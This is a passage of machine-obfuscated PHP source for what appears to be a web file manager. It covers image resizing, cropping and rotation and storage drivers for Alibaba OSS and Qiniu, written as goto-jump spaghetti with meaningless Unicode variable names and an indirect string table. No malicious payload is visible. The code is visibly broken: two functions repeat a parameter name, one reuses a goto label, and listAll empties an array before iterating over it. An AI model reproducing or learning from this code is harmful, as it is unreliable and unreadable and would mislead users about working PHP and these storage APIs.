($this->srcH / $this->srcW); } else { $E羌 = $EŻ; $aܥ = $E羌 * ($this->srcW / $this->srcH); } if ($this->srcW > $c䖱 || $this->srcH > $EŻ) { $Bڸ = $this->{$_SERVER[拘][2345]}($this->im, $aܥ, $E羌, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->{$_SERVER[拘][2346]}($Bڸ, $fŅ); } else { $Bڸ = $this->{$_SERVER[拘][2345]}($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->{$_SERVER[拘][2346]}($Bڸ, $fŅ); } } function cut($Cބ, $EÂ, $D̫) { goto dڹɣ; dڹɣ: $B = $EÂ / $D̫; $a = $this->srcW / $this->srcH; if ($B <= $a) { $dԱ = $D̫; $F펠ٽ = $dԱ * ($this->srcW / $this->srcH); } else { $F펠ٽ = $EÂ; $dԱ = $F펠ٽ * ($this->srcH / $this->srcW); } goto f; f: $e銿 = $this->{$_SERVER[拘][2345]}($this->im, $F펠ٽ, $dԱ, 0, 0, 0, 0, $this->srcW, $this->srcH); $Eչ = $this->{$_SERVER[拘][2345]}($e銿, $EÂ, $D̫, 0, 0, ($F펠ٽ - $EÂ) / 2, ($dԱ - $D̫) / 2, $EÂ, $D̫); $_SERVER[拘][2347]($e銿); goto BҊ; BҊ: return $this->{$_SERVER[拘][2346]}($Eչ, $Cބ); goto Bݧ; Bݧ: } function backFill($b񂂚, $D, $cو, $d = false, $dК = 255, $Cܧ = 255, $aѾ = 255) { goto fȍŨ; b菲⟸: $Fǵܸ = $c[2272]($B, $dК, $Cܧ, $aѾ); if ($d) { $Fǵܸ = $c[2351]($B, $Fǵܸ); $Aǯф = $cو - $f퐔ħ; } $c[2352]($B, 0, 0, $D, $cو, $Fǵܸ); goto B㋹; B㼽: if ($Eȿס <= $b) { $bϑ = $D; $f퐔ħ = $bϑ * ($this->srcH / $this->srcW); } else { $f퐔ħ = $cو; $bϑ = $f퐔ħ * ($this->srcW / $this->srcH); } if ($c[534]($c[2348])) { @($B = $c[2349]($D, $cو)); if (!$B) { $B = $c[2350]($D, $cو); } } else { $B = $c[2350]($D, $cو); } $Aǯф = ($cو - $f퐔ħ) / 2; goto b菲⟸; fȍŨ: $c =& $_SERVER[拘]; $Eȿס = $D / $cو; $b = $this->srcW / $this->srcH; goto B㼽; B㋹: if ($this->srcW > $D || $this->srcH > $cو) { $c͆ = $this->{$_SERVER[拘][2345]}($this->im, $bϑ, $f퐔ħ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($bϑ < $D) { $c[2353]($B, $c͆, ($D - $bϑ) / 2, 0, 0, 0, $bϑ, $f퐔ħ); } else { if ($f퐔ħ < $cو) { $c[2353]($B, $c͆, 0, $Aǯф, 0, 0, $bϑ, $f퐔ħ); } else { $c[2353]($B, $c͆, 0, 0, 0, 0, $bϑ, $f퐔ħ); } } } else { $c[2354]($B, $this->im, ($D - $bϑ) / 2, $Aǯф, 0, 0, $bϑ, $f퐔ħ, 100); } return $this->{$_SERVER[拘][2346]}($B, $b񂂚); goto FȆ; FȆ: } function creatImage($aϙ, $dщ, $d⺴, $b϶ڇ, $D썍, $F, $f, $Cɽ, $Eќģ) { $Aϰ =& $_SERVER[拘]; if ($Aϰ[534]($Aϰ[2348])) { @($d󋓭 = $Aϰ[2355]($dщ, $d⺴)); @$Aϰ[2279]($d󋓭, !1); @$Aϰ[2280]($d󋓭, !0); if ($d󋓭) { $Aϰ[2356]($d󋓭, $aϙ, $b϶ڇ, $D썍, $F, $f, $dщ, $d⺴, $Cɽ, $Eќģ); } else { $d󋓭 = $Aϰ[2357]($dщ, $d⺴); $Aϰ[2358]($d󋓭, $aϙ, $b϶ڇ, $D썍, $F, $f, $dщ, $d⺴, $Cɽ, $Eќģ); } } else { $d󋓭 = $Aϰ[2357]($dщ, $d⺴); $Aϰ[2358]($d󋓭, $aϙ, $b϶ڇ, $D썍, $F, $f, $dщ, $d⺴, $Cɽ, $Eќģ); } return $d󋓭; } public function imgRotate($f˻и, $c̍) { goto f; Eٛ: $F = !1; switch ($this->imgData[2]) { case IMAGETYPE_GIF: $F = $Aۚ[2361]($Dˤޡ, $f˻и); break; case IMAGETYPE_JPEG: $F = $Aۚ[2362]($Dˤޡ, $f˻и, 100); break; case IMAGETYPE_PNG: $F = $Aۚ[2363]($Dˤޡ, $f˻и); break; default: break; } $Aۚ[2347]($Dˤޡ); goto Eԛ; f: $Aۚ =& $_SERVER[拘]; if (!$this->im || $c̍ % 360 === 0 || !$Aۚ[534]($Aۚ[2359])) { return !1; } $Dˤޡ = $Aۚ[2360]($this->im, 360 - $c̍, 0); goto Eٛ; Eԛ: $Aۚ[2347]($this->im); return $F; goto d敹; d敹: } function echoImage($c, $B) { goto DЫ; Dۤ: $C뻯 = !1; switch ($this->echoType) { case $dҲ󐧤[2364]: $C뻯 = $dҲ󐧤[2363]($c); break; case $dҲ󐧤[18]: $C뻯 = $dҲ󐧤[2363]($c, $B); break; } $dҲ󐧤[2347]($c); goto AԲ; AԲ: $dҲ󐧤[2347]($this->im); return $C뻯; goto aԑ; DЫ: $dҲ󐧤 =& $_SERVER[拘]; if (!$c) { return !1; } $dҲ󐧤[2236](); goto Dۤ; aԑ: } } goto Bޫߒ; a: function cacheLockWait() { usleep(mt_rand(5, 100) * 100); } $dʯ = LIB_DIR . $_SERVER[拘][31]; $b = $_SERVER[拘][32]; goto c; BӨ߆: class PathDriverOSS extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $domain = ''; private $bucket = ''; private $ossClient = null; private $bucketAcl = ''; private $endpoint = null; public function __construct($a藂) { parent::__construct(); include_once SDK_DIR . $_SERVER[拘][867]; $this->{$_SERVER[拘][526]}($a藂); } private function _init($Eƾ) { $dΉ =& $_SERVER[拘]; foreach ($Eƾ as $E޷ => $f) { if (isset($this->{$E޷})) { $this->{$E޷} = $f; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { $dΉ[29]($dΉ[868], !1); } $this->ossClient = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function mkfile($Dփ, $BӎÌ = '', $dƷ = REPEAT_RENAME) { $e = $this->{$_SERVER[拘][508]}($Dփ, $BӎÌ); if ($e !== !1) { return $this->{$_SERVER[拘][378]}($Dփ); } return !1; } public function mkdir($eލ, $cކ = REPEAT_SKIP) { if ($this->{$_SERVER[拘][385]}($eލ)) { return $this->{$_SERVER[拘][378]}($eލ); } try { $this->ossClient->{$_SERVER[拘][869]}($this->bucket, $eލ); } catch (OSS\Core\OssException $f󤄃) { return !1; } return $this->{$_SERVER[拘][378]}($eލ); } private function fileList($cɌϮ, $Fܪ = '', $eݑ = 0) { goto a; D: while (!0) { $C֖ = array($A٨[870] => $Fܪ, $A٨[769] => $bȼ, $A٨[871] => $Aʄ, $A٨[872] => $FЍ뺂); try { $C訾Ώ = $this->ossClient->{$_SERVER[拘][873]}($this->bucket, $C֖); } catch (OSS\Core\OssException $c) { break; } $FЍ뺂 = $C訾Ώ->{$_SERVER[拘][874]}(); $f = $C訾Ώ->{$_SERVER[拘][875]}(); $f춱 = $C訾Ώ->{$_SERVER[拘][876]}(); foreach ($f as $eц) { if ($eц->{$_SERVER[拘][877]}() == $bȼ) { continue; } $CǨ = $eц->{$_SERVER[拘][877]}(); if ($eݑ) { $CǨ = array($A٨[375] => $CǨ, $A٨[490] => $eц->{$_SERVER[拘][878]}(), $A٨[772] => $A٨[671]($eц->{$_SERVER[拘][879]}())); } $dʭ[] = $CǨ; } foreach ($f춱 as $C) { $cт£[] = $C->{$_SERVER[拘][880]}(); } if ($FЍ뺂 === $A٨[67]) { break; } } return array($A٨[399] => $cт£, $A٨[398] => $dʭ); goto fڏ; a: $A٨ =& $_SERVER[拘]; $cɌϮ = $A٨[70]($cɌϮ, $A٨[44]); $bȼ = empty($cɌϮ) ? $A٨[67] : $cɌϮ . $A٨[44]; goto AǠ; AǠ: $FЍ뺂 = $A٨[67]; $Aʄ = 1000; $cт£ = $dʭ = array(); goto D; fڏ: } public function copyFile($F, $E) { $bƛĴ =& $_SERVER[拘]; $B = $this->{$_SERVER[拘][567]}($F); if ($B < 1024 * 1024 * 1024) { try { $this->ossClient->{$_SERVER[拘][758]}($this->bucket, $F, $this->bucket, $E); } catch (OSS\Core\OssException $Dܧ) { return !1; } return !0; } try { goto B녢; Aҙ: $bƏؙ[] = array($bƛĴ[861] => $c합, $bƛĴ[862] => $dߐ); $this->ossClient->{$_SERVER[拘][884]}($this->bucket, $E, $fѬ, $bƏؙ); goto c; B녢: $A = array(); $A섇 = $this->{$_SERVER[拘][616]}($F); if ($A섇) { $A = array(OSS\OssClient::OSS_HEADERS => array($bƛĴ[881] => $this->{$_SERVER[拘][616]}($F))); } goto f; f: $fѬ = $this->ossClient->{$_SERVER[拘][882]}($this->bucket, $E, $A); $c합 = 1; $dߐ = $this->ossClient->{$_SERVER[拘][883]}($this->bucket, $F, $this->bucket, $E, $c합, $fѬ, $A); goto Aҙ; c: } catch (OSS\Core\OssException $Dܧ) { return !1; } return !0; } public function moveFile($aˍ, $a±) { if ($this->{$_SERVER[拘][374]}($aˍ, $a±)) { $this->{$_SERVER[拘][62]}($aˍ); return !0; } return !1; } public function delFile($b݅ø) { try { $this->ossClient->{$_SERVER[拘][763]}($this->bucket, $b݅ø); } catch (OSS\Core\OssException $C۴Ǽ) { return !1; } return !0; } public function delFolder($d洊س) { $bݶጱ =& $_SERVER[拘]; $e䲄 = $this->{$_SERVER[拘][885]}($d洊س); if (!empty($d洊س) && !$bݶጱ[176]($bݶጱ[70]($d洊س, $bݶጱ[44]) . $bݶጱ[44], $e䲄[$bݶጱ[398]])) { $e䲄[$bݶጱ[398]][] = $bݶጱ[70]($d洊س, $bݶጱ[44]) . $bݶጱ[44]; } foreach ($bݶጱ[765]($e䲄[$bݶጱ[398]], 1000) as $F) { try { $this->ossClient->{$_SERVER[拘][767]}($this->bucket, $F); } catch (OSS\Core\OssException $fټō) { return !1; } } return !0; } public function rename($dߋ, $b) { return $this->{$_SERVER[拘][768]}($dߋ, $b); } public function size($Eꤕ) { if (!$this->{$_SERVER[拘][379]}($Eꤕ)) { return 0; } try { $dݵ = $this->ossClient->{$_SERVER[拘][886]}($this->bucket, $Eꤕ); } catch (OSS\Core\OssException $Eޭ؎) { return !1; } return $dݵ[$_SERVER[拘][887]]; } public function info($b퍄) { if ($this->{$_SERVER[拘][385]}($b퍄)) { return $this->{$_SERVER[拘][556]}($b퍄, 1); } if (!$this->{$_SERVER[拘][379]}($b퍄)) { return !1; } return $this->{$_SERVER[拘][555]}($b퍄); } private function fileInfo($C񏳢, $B = array(), $aյ = false) { goto bƄ; Fʨ : if (isset($B[$cჸ[558]])) { $eސ[$cჸ[558]] = $B[$cჸ[558]]; } return $eސ; goto BՋ; bƄ: $cჸ =& $_SERVER[拘]; if ($aյ) { return array($cჸ[375] => $this->{$_SERVER[拘][392]}($C񏳢), $cჸ[40] => $this->{$_SERVER[拘][378]}($C񏳢), $cჸ[400] => $cჸ[18], $cჸ[565] => $this->{$_SERVER[拘][566]}($C񏳢), $cჸ[490] => isset($B[$cჸ[490]]) ? $B[$cჸ[490]] : 0); } $eސ = array($cჸ[375] => $this->{$_SERVER[拘][392]}($C񏳢), $cჸ[40] => $this->{$_SERVER[拘][378]}($C񏳢), $cჸ[400] => $cჸ[18], $cჸ[558] => $cჸ[168], $cჸ[559] => $cჸ[168], $cჸ[490] => 0, $cჸ[565] => $this->{$_SERVER[拘][566]}($C񏳢), $cჸ[770] => $cჸ[67], $cჸ[771] => !0, $cჸ[717] => !0); goto Aݲ; Aݲ: if (empty($B)) { $fѾ = $this->ossClient->{$_SERVER[拘][886]}($this->bucket, $C񏳢); if (!$fѾ) { return $eސ; } $B = array($cჸ[558] => $fѾ[$cჸ[888]][$cჸ[889]], $cჸ[772] => $cჸ[671]($fѾ[$cჸ[890]]), $cჸ[490] => $fѾ[$cჸ[887]]); $this->{$_SERVER[拘][605]}($C񏳢, $eސ); } $eސ[$cჸ[559]] = $B[$cჸ[772]]; $eސ[$cჸ[490]] = $B[$cჸ[490]]; goto Fʨ ; BՋ: } private function folderInfo($F, $Eƙ = 0, $f = false) { $E։ =& $_SERVER[拘]; if ($f) { return array($E։[375] => $this->{$_SERVER[拘][392]}($F), $E։[40] => $this->{$_SERVER[拘][378]}($E։[44] . $F), $E։[400] => $E։[557]); } $B򡬎 = array($E։[375] => $this->{$_SERVER[拘][392]}($F), $E։[40] => $this->{$_SERVER[拘][378]}($E։[44] . $F), $E։[400] => $E։[557], $E։[558] => $E։[168], $E։[559] => $E։[168], $E։[562] => !1, $E։[564] => !1, $E։[771] => !0, $E։[717] => !0); if ($Eƙ) { $B򡬎[$E։[562]] = $this->{$_SERVER[拘][563]}($F, !1); $B򡬎[$E։[564]] = $this->{$_SERVER[拘][563]}($F, !0); } return $B򡬎; } public function exist($C) { if ($this->{$_SERVER[拘][379]}($C) || $this->{$_SERVER[拘][385]}($C)) { return !0; } return !1; } public function isFile($b׺) { if ($this->{$_SERVER[拘][385]}($b׺)) { return !1; } try { return $this->ossClient->{$_SERVER[拘][891]}($this->bucket, $b׺); } catch (OSS\Core\OssException $Eյ) { return !1; } } public function isFolder($a̛) { $d㺍 =& $_SERVER[拘]; try { $a̛ = $d㺍[70]($a̛, $d㺍[44]); $E = array($d㺍[870] => $d㺍[44], $d㺍[769] => empty($a̛) ? $d㺍[67] : $a̛ . $d㺍[44], $d㺍[871] => 1, $d㺍[872] => $d㺍[67]); $e勹Έ = $this->ossClient->{$_SERVER[拘][873]}($this->bucket, $E); } catch (OSS\Core\OssException $C󴼕) { return !1; } $Dσ = $e勹Έ->{$_SERVER[拘][875]}(); $B = $e勹Έ->{$_SERVER[拘][876]}(); return empty($Dσ) && empty($B) ? !1 : !0; } public function listPath($Cҧ, $fڇ = false, $e燕 = false) { $F =& $_SERVER[拘]; $dƸ睐 = $this->{$_SERVER[拘][885]}($Cҧ, $F[44], 1); foreach ($dƸ睐[$F[399]] as $c => $Cⱨ) { $dƸ睐[$F[399]][$c] = $this->{$_SERVER[拘][556]}($Cⱨ, $fڇ, $e燕); } foreach ($dƸ睐[$F[398]] as $c => $e䷋) { $dƸ睐[$F[398]][$c] = $this->{$_SERVER[拘][555]}($e䷋[$F[375]], $e䷋, $e燕); } return $dƸ睐; } public function has($Cꆌ, $Dث = true) { goto D; D: $F =& $_SERVER[拘]; $Cꆌ = $F[70]($Cꆌ, $F[44]); $b = empty($Cꆌ) ? $F[67] : $Cꆌ . $F[44]; goto F͆; Dǹ: return !1; goto FÐ; F͆: $Bݢ = $F[67]; $e = 100; while (!0) { $c = array($F[870] => $F[44], $F[769] => $b, $F[871] => $e, $F[872] => $Bݢ); try { $E䂥 = $this->ossClient->{$_SERVER[拘][873]}($this->bucket, $c); } catch (OSS\Core\OssException $fͪ՚ш) { break; } $Bݢ = $E䂥->{$_SERVER[拘][874]}(); $c񭖑̝ = $E䂥->{$_SERVER[拘][875]}(); $Bʫ = $E䂥->{$_SERVER[拘][876]}(); if ($Dث) { if (!empty($c񭖑̝)) { if ($F[37]($c񭖑̝) > 1 || $c񭖑̝[0]->{$_SERVER[拘][877]}() != $b) { return !0; } } } else { if (!empty($Bʫ)) { return !0; } } if ($Bݢ === $F[67]) { break; } } goto Dǹ; FÐ: } public function listAll($Cķ) { $Eء =& $_SERVER[拘]; $B = $this->{$_SERVER[拘][885]}($Cķ, $Eء[67], 1); $B = array(); foreach ($B[$Eء[398]] as $c) { $B[$c[$Eء[375]]] = $c[$Eء[490]]; } return $this->{$_SERVER[拘][774]}($Cķ, $Eء[766]($B), $B); } public function canRead($D߹) { $fƯў =& $_SERVER[拘]; $eѮ = $this->{$_SERVER[拘][892]}($D߹); return $eѮ == $fƯў[893] || $eѮ == $fƯў[894] ? !0 : !1; } public function canWrite($a儬) { $Eڭ = $this->{$_SERVER[拘][892]}($a儬); return $Eڭ == $_SERVER[拘][894] ? !0 : !1; } public function pathAcl($F) { goto eɝƈ; d: $eʗ = $fׇ == $Cگ[897] ? $this->bucketAcl : $fׇ; if ($eʗ == $Cگ[898]) { return $Cگ[893]; } if ($eʗ == $Cگ[899]) { return $Cگ[894]; } goto d̈; eɝƈ: $Cگ =& $_SERVER[拘]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->ossClient->{$_SERVER[拘][895]}($this->bucket); } try { $fׇ = $this->ossClient->{$_SERVER[拘][896]}($this->bucket, $F); } catch (OSS\Core\OssException $B) { return !1; } goto d; d̈: return $eʗ; goto d; d: } private function chmodPath($a, $eɂ = '') { $e參 =& $_SERVER[拘]; $bƯ⑗ = empty($eɂ) ? $e參[899] : $eɂ; $B驚 = array($e參[897], $e參[759], $e參[898], $e參[899]); if (!$e參[176]($bƯ⑗, $B驚)) { return !1; } try { $this->ossClient->{$_SERVER[拘][900]}($this->bucket, $a, $bƯ⑗); } catch (OSS\Core\OssException $bְٗ) { return !1; } return !0; } public function getContent($D캡) { return $this->{$_SERVER[拘][509]}($D캡, -1); } public function setContent($C, $b׏ݱ = '') { $e焧 =& $_SERVER[拘]; try { $f = array(); $cۨ܇ = $this->ossClient->{$_SERVER[拘][780]}($this->bucket, $C, $b׏ݱ, $f); } catch (OSS\Core\OssException $aé) { return !1; } $this->{$_SERVER[拘][901]}($C, array($e焧[881] => $e焧[70]($cۨ܇[$e焧[902]], $e焧[652]))); return isset($cۨ܇[$e焧[903]][$e焧[844]]) ? (int) $cۨ܇[$e焧[903]][$e焧[844]] : $e焧[195]($cۨ܇); } private function updateObjMeta($B˲, $EĔ) { try { $b® = array(OSS\OssClient::OSS_HEADERS => $EĔ); $this->ossClient->{$_SERVER[拘][758]}($this->bucket, $B˲, $this->bucket, $B˲, $b®); } catch (OSS\Core\OssException $d) { return !1; } return !0; } public function upload($aҊ˖, $EІ, $AΗ = false, $B޿ = REPEAT_REPLACE) { $aճ =& $_SERVER[拘]; $fꄃ醾 = $aճ[70]($aҊ˖, $aճ[44]); $A = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 10485760, OSS\OssClient::OSS_HEADERS => array($aճ[881] => @$aճ[639]($EІ))); try { $this->ossClient->{$_SERVER[拘][904]}($this->bucket, $fꄃ醾, $EІ, $A); } catch (OSS\Core\OssException $aǌ) { return !1; } return $this->{$_SERVER[拘][378]}($aҊ˖); } private function endPoint() { $c៥ =& $_SERVER[拘]; if (!empty($this->endpoint)) { return $this->endpoint; } try { $Bг = $this->ossClient->{$_SERVER[拘][905]}($this->bucket); } catch (OSS\Core\OssException $d) { return !1; } return $this->endpoint = !empty($Bг[$c៥[888]][$c៥[906]]) ? $c៥[70]($Bг[$c៥[888]][$c៥[906]], $c៥[44]) . $c៥[44] : $c៥[67]; } public function uploadFormData($DҨ, $fʣѳ = 3600) { goto B牗; Eʳ: $f减ݢ = $A[908]($A[909], $A[50]() + $Dܣ); $dĥ = new DateTime($f减ݢ); $Eؠ = $dĥ->{$_SERVER[拘][911]}($A[910]::ISO8601); goto c; b᎛: $B = $A[297]($f); $EӤ = $A[800]($B); $f׆ = $A[800]($A[801]($A[802], $EӤ, $this->secret, !0)); goto Cӧ; F̋꤄: $Fؓ҂ = array($A[832], $A[833], $c΢쐱); $f[] = $Fؓ҂; $f = array($A[826] => $Eؠ, $A[829] => $f); goto b᎛; Cӧ: return array($A[845] => $EӤ, $A[915] => $this->accessKey, $A[836] => $A[825], $A[916] => $f׆, $A[129] => $A[70]($d䦉, $A[44])); goto Eܰ; c: $a̅ݒ = $A[165]($Eؠ, $A[912]); $Eؠ = $A[7]($Eؠ, 0, $a̅ݒ) . $A[913]; $E = 1048576000 * 5; goto D; B牗: $A =& $_SERVER[拘]; if (!($d䦉 = $this->{$_SERVER[拘][907]}())) { return !1; } $Dܣ = $fʣѳ; goto Eʳ; D: $aֹ = array($A[914], 0, $E); $f[] = $aֹ; $c΢쐱 = $this->{$_SERVER[拘][372]}($DҨ); goto F̋꤄; Eܰ: } public function multiUploadFormData($f, $D = 3600) { $fۦ =& $_SERVER[拘]; if (!($C· = $this->{$_SERVER[拘][907]}())) { return !1; } $a䎕 = array($fۦ[791] => $fۦ[649]($fۦ[917]), $fۦ[565] => $fۦ[918]); $Dٕ = $this->{$_SERVER[拘][919]}($f, $a䎕, $C·); if (empty($Dٕ[$fۦ[920]])) { return !1; } return array($fۦ[790] => $Dٕ[$fۦ[920]], $fۦ[129] => $C· . $f, $fۦ[791] => $a䎕[$fۦ[791]], $fۦ[257] => $f); } public function multiUploadAuthData($b㓺, $e = array()) { goto E; a: if (!empty($e[$bаٔ[921]])) { $Cܦ = $bаٔ[153](array($cՏ[4]), $e[$bаٔ[921]]); $bаٔ[922]($Cܦ); $cՏ[4] = $bаٔ[152]($bаٔ[36], $Cܦ); } $fɑ = $bаٔ[152]($bаٔ[36], $cՏ); $eم = $bаٔ[800]($bаٔ[801]($bаٔ[802], $fɑ, $this->secret, !0)); goto Bܒ; E: $bаٔ =& $_SERVER[拘]; $D = isset($e[$bаٔ[791]]) ? $e[$bаٔ[791]] : $bаٔ[649]($bаٔ[917]); $eʊ = isset($e[$bаٔ[565]]) ? $e[$bаٔ[565]] : $bаٔ[67]; goto D՛ǌ; Bܒ: $e = $bаٔ[923] . $this->accessKey . $bаٔ[91] . $eم; if ($bаٔ[165]($eʊ, $bаٔ[796]) === 0) { $e = array($bаٔ[804] => $e, $bаٔ[791] => $D); } return $e; goto cؖˊ; D՛ǌ: $B = $b㓺; if (isset($e[$bаٔ[257]])) { $B = $e[$bаٔ[257]]; unset($e[$bаٔ[257]]); } if (isset($e[$bаٔ[792]])) { return $this->{$_SERVER[拘][793]}($B, $D, $e); } goto Aᨋ; Aᨋ: $cՏ = array($bаٔ[794], $bаٔ[67], $bаٔ[795], $D, "\170\x2d\x6f\x73\163\x2d\x64\x61\164\x65\x3a{$D}", $bаٔ[44] . $this->bucket . $bаٔ[44] . $B . $eʊ); if ($bаٔ[165]($eʊ, $bаٔ[796]) === 0) { $cՏ[0] = $bаٔ[797]; } if (isset($e[$bаٔ[798]]) && $e[$bаٔ[798]] == $bаٔ[799]) { $cՏ[0] = $bаٔ[799]; } goto a; cؖˊ: } public function listUploadParts($aƦѕ, $e, $Cȥ) { goto C; D: $Cƚ = $this->{$_SERVER[拘][807]}($aƦѕ, $Cȥ); if (empty($Cƚ)) { return !1; } return array($c̈́[804] => $Cƚ, $c̈́[791] => $e, $c̈́[808] => $a߳); goto c; eذ: $FمБ = $this->{$_SERVER[拘][919]}($aƦѕ, $Cȥ); if (!$FمБ || empty($FمБ[$c̈́[924]])) { return !1; } if ($c̈́[37]($FمБ[$c̈́[924]]) == $c̈́[37]($FمБ[$c̈́[924]], 1) && isset($FمБ[$c̈́[924]][$c̈́[861]])) { $FمБ[$c̈́[924]] = array($FمБ[$c̈́[924]]); } goto BĨ; C: $c̈́ =& $_SERVER[拘]; $Cȥ[$c̈́[791]] = $e; $Cȥ[$c̈́[798]] = $c̈́[799]; goto eذ; BĨ: $a߳ = array(); foreach ($FمБ[$c̈́[924]] as $Dꓗ) { $a߳[] = array($c̈́[861] => $Dꓗ[$c̈́[861]], $c̈́[862] => $c̈́[70]($Dꓗ[$c̈́[862]], $c̈́[652])); } unset($Cȥ[$c̈́[792]], $Cȥ[$c̈́[798]]); goto D; c: } public function ossRequest($f, $d왔 = array(), $f = '') { goto c߄; Cʎ: $e͓ɾ = $this->{$_SERVER[拘][807]}($f, $d왔); if (!$e͓ɾ) { return !1; } $f֗ = array($aǬ[925] . $e͓ɾ, $aǬ[926], $aǬ[927] . $d왔[$aǬ[791]]); goto Cϑ; c߄: $aǬ =& $_SERVER[拘]; $f = empty($f) ? $this->{$_SERVER[拘][907]}() : $f; unset($d왔[$aǬ[792]]); goto Cʎ; Cϑ: $c = $f . $f . $d왔[$aǬ[565]]; $B = isset($d왔[$aǬ[798]]) ? $d왔[$aǬ[798]] : $aǬ[794]; $Aؖ = $aǬ[740]($c, $B, !1, $f֗); goto DĄ; DĄ: if (!$Aؖ[$aǬ[928]]) { return !1; } return $aǬ[929]($Aؖ[$aǬ[733]]); goto bʼ; bʼ: } public function download($Fл, $a˹) { if ($this->{$_SERVER[拘][385]}($Fл)) { return !1; } $F = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $a˹); try { $this->ossClient->{$_SERVER[拘][779]}($this->bucket, $Fл, $F); } catch (OSS\Core\OssException $dʳǚ) { return !1; } return $a˹; } public function fileSubstr($D, $b = 0, $e驽 = false) { if ($b === -1) { $eɈ = array(); } else { if ($e驽 === !1) { $DϪ = $this->{$_SERVER[拘][567]}($D); } else { $DϪ = $b + $e驽 - 1; } $eɈ = array(OSS\OssClient::OSS_RANGE => "{$b}\x2d{$DϪ}"); } try { $d℄ʎ = $this->ossClient->{$_SERVER[拘][779]}($this->bucket, $D, $eɈ); } catch (OSS\Core\OssException $Cң) { return !1; } return $d℄ʎ; } public function link($Fǽ, $Fޭ = array()) { if (!$this->{$_SERVER[拘][389]}($Fǽ) || $this->{$_SERVER[拘][385]}($Fǽ)) { return !1; } try { $DʓĪ = !empty($Fޭ) ? $Fޭ : array(); return $this->ossClient->{$_SERVER[拘][930]}($this->bucket, $Fǽ, 36000, $_SERVER[拘][799], $DʓĪ); } catch (OSS\Core\OssException $Dά߻) { return !1; } } public function fileOut($cƔ߇, $d̤ = false, $e咝 = false, $Cև = '') { goto bޛ; fŘ: die; goto DҔ; Eھ: $AՅ[OSS\OssClient::OSS_SUB_RESOURCE] .= $f߿֊[933] . $f߿֊[653]($f߿֊[708]($e咝)); $aѲ = $this->{$_SERVER[拘][521]}($cƔ߇, $AՅ); $f߿֊[657]($f߿֊[815] . $aѲ); goto fŘ; bޛ: $f߿֊ =& $_SERVER[拘]; $d̤ = $d̤ ? $f߿֊[810] : $f߿֊[811]; $AՅ = array(OSS\OssClient::OSS_SUB_RESOURCE => $f߿֊[931] . $d̤ . $f߿֊[932] . $f߿֊[655]($e咝)); goto Eھ; DҔ: } public function fileOutImage($BÄ𳟛, $eŷ = 250) { $dᒠ֤ =& $_SERVER[拘]; $a = array(OSS\OssClient::OSS_PROCESS => $dᒠ֤[934] . $eŷ); $e = $this->{$_SERVER[拘][521]}($BÄ𳟛, $a); $dᒠ֤[657]($dᒠ֤[815] . $e); die; } public function hashMd5($dٟ嘏, $c鰌ɑ = '') { $c܃ =& $_SERVER[拘]; try { $E = $this->ossClient->{$_SERVER[拘][886]}($this->bucket, $dٟ嘏); } catch (OSS\Core\OssException $cឪƈ) { return !1; } if (!isset($E[$c܃[881]]) && !empty($c鰌ɑ)) { $F難 = $this->{$_SERVER[拘][901]}($dٟ嘏, array($c܃[881] => $c鰌ɑ)); $E[$c܃[881]] = $F難 ? $c鰌ɑ : $c܃[67]; } return isset($E[$c܃[881]]) ? $E[$c܃[881]] : $c܃[67]; } private function fileInfoImage($d, &$d) { goto Bޏ; Bޏ: $Fι =& $_SERVER[拘]; $Dи = array($Fι[606], $Fι[607], $Fι[608], $Fι[609], $Fι[610]); if (!$Fι[176]($d[$Fι[565]], $Dи)) { return; } goto cԽ; cԽ: $f͊ = array(OSS\OssClient::OSS_PROCESS => $Fι[935]); $Bߊᐈ = $this->{$_SERVER[拘][521]}($d, $f͊); $a﵋ = $Fι[740]($Bߊᐈ, $Fι[799], !1, !1, !1, !0); goto B籙; B籙: if (!$a﵋[$Fι[928]]) { return !1; } $d[$Fι[612]] = array($Fι[613] => $a﵋[$Fι[733]][$Fι[936]][$Fι[937]], $Fι[817] => $a﵋[$Fι[733]][$Fι[938]][$Fι[937]]); goto A; A: } } class PathDriverQiniu extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $domain = ''; private $region = ''; private $bucket = ''; private $auth = null; private $client = null; private $config = null; private $bucketManager = null; public function __construct($eɖ) { parent::__construct(); require_once SDK_DIR . $_SERVER[拘][939]; $this->{$_SERVER[拘][526]}($eɖ); } private function _init($Bז) { goto e; d: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto AŇƎᇦ; dۅ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto d; e: $Eç =& $_SERVER[拘]; foreach ($Bז as $aտ => $aɐﰿ) { if (isset($this->{$aտ})) { $this->{$aտ} = $aɐﰿ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { $Eç[29]($Eç[940], !1); } goto dۅ; AŇƎᇦ: } public function mkfile($d緢, $f = '', $bߋ = REPEAT_RENAME) { if ($this->{$_SERVER[拘][508]}($d緢, $f)) { return $this->{$_SERVER[拘][378]}($d緢); } return !1; } public function mkdir($e۝, $a = REPEAT_SKIP) { goto C; c: $A = TEMP_FILES . $F޼[405](15) . $F޼[44]; if (!@$F޼[41]($A, 511, !0)) { return !1; } $C = !1; goto Bݏ΂; C: $F޼ =& $_SERVER[拘]; $a = $F޼[70]($e۝, $F޼[44]); if ($this->{$_SERVER[拘][385]}($a)) { return $this->{$_SERVER[拘][378]}($a); } goto c; Bݏ΂: if ($this->{$_SERVER[拘][408]}($a . $F޼[44], $F޼[43]($A, $F޼[44]))) { $C = $this->{$_SERVER[拘][378]}($a); } @$F޼[51]($A); return $C; goto E; E: } public function copyFile($Dꘖ, $b) { $C֙ = $this->bucketManager->{$_SERVER[拘][487]}($this->bucket, $Dꘖ, $this->bucket, $b, !0); return $C֙ ? !1 : !0; } public function moveFile($d̙, $FݽϽ) { $eȈ = $this->bucketManager->{$_SERVER[拘][488]}($this->bucket, $d̙, $this->bucket, $FݽϽ, !0); return $eȈ ? !1 : !0; } public function delFile($a) { $Bޚ 